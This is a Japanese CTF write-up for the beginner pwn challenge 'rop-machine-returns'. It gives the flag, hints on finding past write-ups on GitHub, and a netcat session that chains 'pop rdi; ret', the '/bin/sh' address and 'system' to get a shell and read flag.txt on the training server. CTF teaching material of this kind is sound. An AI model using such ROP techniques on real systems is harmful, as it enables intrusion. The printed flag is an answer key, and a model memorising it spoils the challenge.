---
title: rop-machine-returns
level: 2
flag: FLAG{please-learn-how-to-use-rop-machine}
writer: saru
badge: true
---


# rop-machine-returns [pwn]
## 問題文

```
nc rop-machine-returns.pwn.wanictf.org 9004
```

### ヒント

+ 「参考になるwriteupを探す練習」用の問題です。
+ CTFではwriteupを探すと過去の問題で参考になる情報が載っているページがあったりすることが多く、それを読みながら少しずつ自分の技術力を高めていきます。
+ rop-machineを使った問題はWaniCTF'21-springでも出しています。
+ githubで`wanictf rop writeup`で検索すると何か出てくるかもしれません。
+ rop machineの使い方->[wani-hackase/rop-machine](https://github.com/wani-hackase/rop-machine/)


## 解法

writeupを探すときにgithubの中を直接探す方法もあるよ、ということを伝えるために作った問題です。
writeupを書くのは結構大変なのですが、solverのコードだけgithubで公開している人も結構多いです。
そしてgithubの情報って意外にGoogleでは引っかかり辛い感覚があるのでgithubを直接検索するのがお薦めです。
今回の場合、[wanictf21spring-writeup/pwn](https://github.com/wani-hackase/wanictf21spring-writeup/tree/b6888c5d23e28935e4729d46e47502bef89a5481/pwn)あたりが引っかかるかと思います。
今回はrop-machine-finalにチャレンジしてもらうための前準備のために入れました。

```
$ nc rop-machine-returns.pwn.wanictf.org 9004
welcome to rop-machine-returns!!!

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "system" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 2
"pop rdi; ret" is appended
> 1
hex value?: 404070
0x0000000000404070 is appended
> 3
"system" is appended
> 0
     rop_arena
+--------------------+
| pop rdi; ret       |<- rop start
+--------------------+
| 0x0000000000404070 |
+--------------------+
| system             |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{please-learn-how-to-use-rop-machine}
```

より詳細な解説はWaniCTF'21-springの[rop-machine-easy](https://github.com/wani-hackase/wanictf21s-challenge/tree/13da0b8db952e543523e5ca4995222fc924c3cbe/pwn/03-rop-machine-easy)のwriteupをご参照下さい。
